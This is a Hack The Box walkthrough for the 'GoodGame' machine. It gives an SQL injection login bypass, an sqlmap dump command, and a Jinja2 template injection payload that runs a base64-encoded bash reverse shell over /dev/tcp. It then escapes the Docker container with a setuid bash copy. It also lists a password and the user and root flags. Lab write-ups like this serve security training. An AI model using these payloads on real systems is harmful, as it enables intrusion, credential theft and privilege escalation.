---
title: "GoodGame from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# GoodGame from HTB
`nmap`showed:
```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
```
Site runs on `werkzeug`same as `flask` so maybe we'll have to use `ssti`
add this to `/etc/hosts`
```
10.10.11.130 goodgame.htb
```
Access the site and on top left there is login button. Click that
turn on `burpsuite + intercept`and type in whatever you want. In `burpsuite`you need to modify payload like:
```
email=admin' or 1=1 -- - &password=
```
This will get you logged in
Then you can see `email`which is `admin@goodgames.htb`
we''ll have to find what is `password`with `sqlmap`
after enumerating and finding this is the last code for `sqlmap`
```
sqlmap -r goodgame.req -D main -T user --dump
```
`goodgame.req`is `burpsuite payload`
```
POST /login HTTP/1.1
Host: goodgame.htb
Content-Length: 40
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://goodgame.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.5
Referer: http://goodgame.htb/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

email=admin@goodgames.htb&password=admin
```

On top left there is `settings`logo which redirects you to `subdomain`. Add that to `/etc/hosts`
```
10.10.11.130 internal-administration.goodgames.htb
```
Then access it.
Go to `settings`and it's time for `ssti`. Change name to `{{7*7}}`if name will be `49`this means `ssti`works and we will need to get `reverse-shell`. It works/
Now will have to push in `base64`payload because normal things didn't work for me like `uploading reverse shell and executing it, etc`
```bash
{% raw %}
echo -ne 'bash -i >& /dev/tcp/<your_port>/<port> 0>&1' | base64
{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}<your_base64_payload>${IFS}|base64${IFS}-d|bash').read()}}
{% endraw %}
```
After that you will get connection on `netcat`
***
User Flag is: 4e2c8d476534e7d6a3cd3969e3b2f1cf
***
You will be root but you are in docker.
`remember if you are root in docker you can always do privilege escalation`
```bash
drwxr-xr-x 2 1000 1000 4096 Dec  2  2021 .
drwxr-xr-x 1 root root 4096 Nov  5  2021 ..
lrwxrwxrwx 1 root root    9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000  220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 1000 1000 3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 1000 1000  807 Oct 19  2021 .profile
-rw-r----- 1 root 1000   33 Aug 17 16:54 user.txt
```
that `1000`indicates that we are in docker
```bash
mount
/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
```
This confirms that.
```bash
ss -tlnp
--------------
-------------------
LISTEN    0         128             172.19.0.1:22               0.0.0.0:*        users:(("sshd",pid=1403,fd=3))
--------------
------------------
```
This means `ssh`is running internally
get another connection or just create another shell-like `idk what to call it`in that listener.\
Then connect to `ssh`as `augustus`with same password as `root`
```bash
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255
        ether 02:42:ac:13:00:02  txqueuelen 0  (Ethernet)
        RX packets 2313  bytes 405545 (396.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1934  bytes 2082199 (1.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
With this we know that we'll have to connect to `172.19.0.1` in `ssh`
```bash
script /dev/null -c bash
Script started, file is /dev/null

ssh augustus@172.19.0.1
augustus@172.19.0.1's password: superadministrator
augustus@GoodGames:~$
```
Then copy `/bin/bash`to home directory and in other connection where you are `root`give it `root euid`
```bash
augustus@GoodGames:~$ exit
root@3a453ab39d3d:/home/augustus# chown root:root bash
root@3a453ab39d3d:/home/augustus# chmod 4755 bash
```
Then go to `ssh`and execute `./bash`and become root like this:
```bash
augustus@GoodGames:~$ ./bash -p
bash-5.1# id
id
uid=1000(augustus) gid=1000(augustus) euid=0(root) groups=1000(augustus)
```
***
Root Flag is: 7f0f9e85759eacd8102d1525227a3b12
***
![](/assets/images/Screenshot from 2024-08-17 22-04-50.png)
